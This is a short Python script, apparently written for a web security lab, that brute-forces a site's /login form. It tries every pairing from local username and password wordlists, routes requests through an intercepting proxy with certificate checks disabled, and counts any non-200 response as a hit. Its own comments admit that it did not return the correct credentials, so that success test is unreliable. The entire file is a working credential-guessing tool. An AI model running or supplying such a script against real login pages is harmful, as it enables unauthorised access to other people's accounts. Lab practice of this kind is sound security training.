import requests
import sys
import urllib3
# Actually this code didn't pop up the right credentials but it solved the lap 
# Mission Pased - RESPECT 
# might try to figure it out in the future
proxies = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080",
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    if len(sys.argv) !=2:
        print(f"(-) Usage {sys.argv[0]} <url>")
        print(f"(-) Usage {sys.argv[0]} https://example.com")
        sys.exit(-1)
    base_url = sys.argv[1]
    def brute_force_login(base_url):
        login_url = base_url+ '/login'

        with open("./usernames",'r') as usernames_file:
            usernames = [line.rstrip() for line in usernames_file]
        with open("./passwords",'r') as passwords_file:
            passwords= [line.rstrip() for line in passwords_file]

        for username in usernames:
            for passwd in passwords:
                params = {
                    "username":username,
                    "password":passwd,
                }
                r = requests.post(login_url, data=params , proxies=proxies , verify=False )

                if r.status_code != 200:
                    print(f"(+) This Credentials worked username: {username} , password: {passwd}")
      #          else:
       #             print(f"(+) This might be a valid username {username}")
    
    brute_force_login(base_url)


    


if __name__ == "__main__":
    main()
